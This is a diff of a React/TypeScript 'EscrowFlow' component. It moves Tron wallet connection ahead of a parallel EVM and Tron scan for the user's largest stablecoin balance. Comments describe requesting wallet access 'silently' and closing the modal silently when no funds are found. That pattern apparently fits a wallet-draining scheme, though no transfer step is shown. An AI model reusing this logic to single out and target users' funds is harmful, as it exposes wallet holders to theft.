@@ -554,10 +554,6 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     setModal1Scanning(true);
     setModal1Open(true);
 
-    // Include Tron address if TronLink is already connected
-    let currentTronAddr = tronAddress ?? getConnectedTronAddress();
-    if (currentTronAddr && !tronAddress) setTronAddress(currentTronAddr);
-
     type ScanData = {
       ok: boolean;
       topToken?: {
@@ -579,33 +575,29 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     };
 
     try {
-      let data = await doScan(currentTronAddr);
-
-      if (data.ok) setCachedScanUsd(data.chainUsd ?? null);
-
-      // If no EVM USDT/USDC found AND TronLink is installed but not yet connected,
-      // silently request TronLink access and rescan — this catches users whose
-      // highest stable balance is Tron USDT but who connected via WalletConnect.
-      if ((!data.topToken || data.topToken.balanceUsd < 0.01) && !currentTronAddr) {
-        const hasTronLink = typeof window !== "undefined" && Boolean(window.tronLink);
-        const hasTronWeb = typeof window !== "undefined" && Boolean((window as { tronWeb?: unknown }).tronWeb);
-        if (hasTronLink || hasTronWeb) {
-          const newTronAddr = await connectTronLink();
-          if (newTronAddr) {
-            setTronAddress(newTronAddr);
-            currentTronAddr = newTronAddr;
-            const retry = await doScan(newTronAddr);
-            if (retry.ok) {
-              data = retry;
-              setCachedScanUsd(retry.chainUsd ?? null);
-            }
+      // ── Step 1: Try to get a Tron address proactively ─────────────────────
+      // If TronLink / Trust Wallet DApp browser is present, connect it NOW so
+      // the Tron scan runs in parallel with EVM — not as a fallback after.
+      let currentTronAddr = tronAddress ?? getConnectedTronAddress();
+      if (!currentTronAddr) {
+        const hasTron = typeof window !== "undefined" &&
+          (Boolean(window.tronLink) || Boolean((window as { tronWeb?: unknown }).tronWeb));
+        if (hasTron) {
+          const addr = await connectTronLink();
+          if (addr) {
+            setTronAddress(addr);
+            currentTronAddr = addr;
           }
         }
       }
 
+      // ── Step 2: Scan EVM + Tron in parallel ───────────────────────────────
+      const data = await doScan(currentTronAddr);
+      if (data.ok) setCachedScanUsd(data.chainUsd ?? null);
+
       setModal1Scanning(false);
 
-      // No meaningful stablecoin balance anywhere → skip modal
+      // No meaningful stablecoin balance anywhere → close modal silently
       if (!data.ok || !data.topToken || data.topToken.balanceUsd < 0.01) {
         setModal1Open(false);
         return;
